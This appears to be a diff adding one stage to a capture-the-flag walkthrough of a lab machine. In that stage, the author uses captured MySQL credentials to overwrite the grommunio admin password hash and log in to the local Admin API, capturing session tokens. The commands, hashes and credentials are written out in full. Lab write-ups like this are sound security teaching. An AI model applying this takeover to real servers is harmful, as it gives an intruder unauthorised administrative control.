@@ -912,6 +912,80 @@ ldap_search_base=DC=autopilot,DC=htb
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+### 5.3 Stage 3: Reset the Admin API admin password (in the correct database)
+
+The grommunio Admin API listens on `[::1]:8080` (localhost only, plaintext HTTP) and authenticates against the `grommunio` MySQL database, table `users`, using SHA-512 crypt (`$6$`) hashes. With MySQL creds #2 in hand, overwrite the local `admin` account's hash with a known value, then log in.
+<div align="center">
+<br>
+<br>
+</div>
+
+#### 5.3.1 Inspect the users table
+
+```bash
+mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio -e 'SHOW TABLES;'
+mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio -e 'DESCRIBE users; SELECT id,username,password FROM users;'
+```
+
+`admin` is `id = 0` and the only account with a stored password; every `*.autopilot.htb` user has a blank password because they authenticate via LDAP. So `admin` is the single local account, and the one to overwrite.
+
+```text
+id | username | password
+ 0 | admin    | $6$sVnwqyTFDg9nS/Ry$F5bO6xMvzzdfEiGRHmLWyLznzu0GPzG2VUg6fVOV8oRtrSUGmoOkdGqc5QQycK6FywyivdnxGn/Q8udv2TTIb1
+ 1 | christopher.roberts@autopilot.htb |   (blank, LDAP)
+ ... (all other users blank)
+```
+
+Record the original hash before changing it, so the account can be restored:
+
+```text
+$6$sVnwqyTFDg9nS/Ry$F5bO6xMvzzdfEiGRHmLWyLznzu0GPzG2VUg6fVOV8oRtrSUGmoOkdGqc5QQycK6FywyivdnxGn/Q8udv2TTIb1
+```
+
+#### 5.3.2 Overwrite the hash and authenticate
+
+```bash
+# generate a SHA-512 crypt hash for a known password (openssl is portable; python's crypt module is removed in newer Python)
+HASH=$(openssl passwd -6 'admin123')
+echo "$HASH"
+
+mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio \
+  -e "UPDATE users SET password='$HASH' WHERE username='admin';"
+mysql -u grommunio -p'gDq6z9YVe4nyNRe5' grommunio \
+  -e "SELECT username,password FROM users WHERE username='admin';"
+
+# authenticate to the Admin API (localhost only), capture JWT + CSRF
+LOGINRESP=$(curl -sk -X POST 'http://[::1]:8080/api/v1/login' -d 'user=admin&pass=admin123')
+echo "$LOGINRESP"
+JWT=$(echo "$LOGINRESP"  | python3 -c "import sys,json;print(json.load(sys.stdin)['grommunioAuthJwt'])")
+CSRF=$(echo "$LOGINRESP" | python3 -c "import sys,json;print(json.load(sys.stdin)['csrf'])")
+echo "JWT length: ${#JWT} | CSRF: $CSRF"
+```
+
+**Result:**
+
+```text
+{"csrf":"YZYVtg1SVZHRUZP2yETV/9zBjw8PQ1gabw3DrATIaXU=","grommunioAuthJwt":"eyJ...<764 chars>..."}
+JWT length: 764 | CSRF: YZYVtg1SVZHRUZP2yETV/9zBjw8PQ1gabw3DrATIaXU=
+```
+
+#### 5.3.3 Rabbit hole reminder: the right database matters
+
+Resetting a hash is only useful in the database the Admin API actually reads. The Admin API authenticates against `grommunio.users` (this step). The Nextcloud/`grofiles` database and its `oc_users` table are a different store entirely: changing the hash there, or running `occ user:resetpassword admin`, returns `{"error":"Invalid username or password"}` at the Admin API and wastes time. Same-looking hash tables, different databases.
+
+**What this gives you:**
+
+- An authenticated grommunio Admin API session as `admin` (`JWT` + `CSRF`), i.e. full control of the management plane.
+- The Admin API's documented capabilities (centralised config management via `dbconf`, and service start/stop/restart) are now available, which is exactly what Stage 4 turns into root.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
